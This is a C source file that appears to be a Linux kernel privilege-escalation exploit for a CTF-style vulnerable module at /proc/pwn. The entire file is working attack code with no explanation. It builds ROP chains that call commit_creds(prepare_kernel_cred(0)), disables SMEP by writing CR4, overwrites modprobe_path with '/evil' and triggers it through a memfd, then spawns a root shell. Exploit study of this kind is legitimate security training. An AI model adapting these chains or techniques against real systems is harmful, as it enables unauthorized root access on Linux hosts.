#define _GNU_SOURCE
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <string.h>
#include <linux/memfd.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>


size_t ko_offset=0xffffffffc0000000;
size_t vm_offset=0;
size_t *prepare_kernel_cred_ptr=0;
size_t *commit_creds_ptr=0;
size_t prepare_kernel_cred=0;
size_t commit_creds=0;
#define  SWAPGS_POPFQ_RET        0x0
#define  IRETQ_RET               0x5
#define  POP_RDI_RET             0x8
#define  POP_RAX_RET             0xe
#define  MOV_CR4_RDI_RET         0xa
#define  MOV__RDI__RAX_RET       0x10
void get_shell(){
	if (getuid()){
		puts("fail, no root");
	}
	else{
		__asm__	(
				"pop rax;"
			);

		system("/bin/sh");
	}
	exit(0);
}
void get_root(){
	void * (*prepare_kernel_cred_ptr)(void *) = (void *)prepare_kernel_cred;
	int (*commit_creds_ptr)(void *) = (void *)commit_creds;
	(*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}
void read_sym(){

	FILE* sym_table_fd = fopen("/tmp/kallsyms", "r");
	if(sym_table_fd < 0)
	{
		printf("[x] Failed to open the sym_table file!\n");
		exit(-1);
	}
	char buf[0x50], type[0x10];
	size_t addr;
	while(fscanf(sym_table_fd, "%llx%s%s", &addr, type, buf))
	{
		if(prepare_kernel_cred && commit_creds)
			break;

		if(!commit_creds && !strcmp(buf, "commit_creds"))
		{
			commit_creds = addr;
			printf("[+] commit_cread: 0x%llx\n", commit_creds);
			continue;
		}

		if(!strcmp(buf, "prepare_kernel_cred"))
		{
			prepare_kernel_cred = addr;
			printf("[+] prepare_kernel_cred: 0x%llx\n", prepare_kernel_cred);
			continue;
		}
	}

}
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	__asm__(
			"mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
	       );
}

size_t rop[40]={0};
int i=0;
void rop_swapgs()
{
	rop[i++]=(size_t)get_root;
	rop[i++]= 0xffffffff81c00aa0;
	rop[i++]= 0;
	rop[i++]= 0;
	rop[i++]=(size_t)get_shell;
	rop[i++]=user_cs;
	rop[i++]=user_rflags;
	rop[i++]=user_sp;
	rop[i++]=user_ss;
	int fd=open("/proc/pwn",2);
	write(fd,rop,sizeof(rop));
}
void rop_base()
{
	rop[i++]=(size_t)get_root;
	rop[i++]=SWAPGS_POPFQ_RET+ko_offset;
	rop[i++]=0;
	rop[i++]=IRETQ_RET+ko_offset;
	rop[i++]=(size_t)get_shell;
	rop[i++]=user_cs;
	rop[i++]=user_rflags;
	rop[i++]=user_sp;
	rop[i++]=user_ss;
	int fd=open("/proc/pwn",2);
	write(fd,rop,sizeof(rop));
}
static void modprobe_trigger_memfd()
{
	int fd;
	char *argv_envp = NULL;

	fd = memfd_create("", MFD_CLOEXEC);
	write(fd, "\xff\xff\xff\xff", 4);

	fexecve(fd, &argv_envp, &argv_envp);

	close(fd);
}
void some_for_modprobe()
{
	FILE*  fd=fopen("/proc/sys/kernel/modprobe","r");
	char buf[0x50];
	fgets(buf,8,fd);
	printf("/proc/sys/kernel/modprobe: %s\n",buf);
	modprobe_trigger_memfd();

}
void rop_modprobe()
{
	rop[i++]=POP_RAX_RET+ko_offset;
	rop[i++]=0x6c6976652f; // rax: |/evil
	rop[i++]=POP_RDI_RET+ko_offset;
	rop[i++]=0xffffffff82442400;
	rop[i++]=MOV__RDI__RAX_RET+ko_offset;
	rop[i++]=SWAPGS_POPFQ_RET+ko_offset;
	rop[i++]=0;
	rop[i++]=IRETQ_RET+ko_offset;
	rop[i++]=(size_t)some_for_modprobe;
	rop[i++]=user_cs;
	rop[i++]=user_rflags;
	rop[i++]=user_sp;
	rop[i++]=user_ss;

	int fd=open("/proc/pwn",2);
	write(fd,rop,sizeof(rop));

}
void rop_offset()
{
	for(;i<8;i++){
		rop[i]=0xdeadbeef;
	}
}
void rop_bypass_smep()
{
	rop[i++]=POP_RDI_RET+ko_offset;
	rop[i++]=0x6f0;
	rop[i++]=MOV_CR4_RDI_RET+ko_offset;
}

int main(){
	save_status();
	read_sym();
	rop_offset();
	rop_bypass_smep();
	rop_modprobe();

}
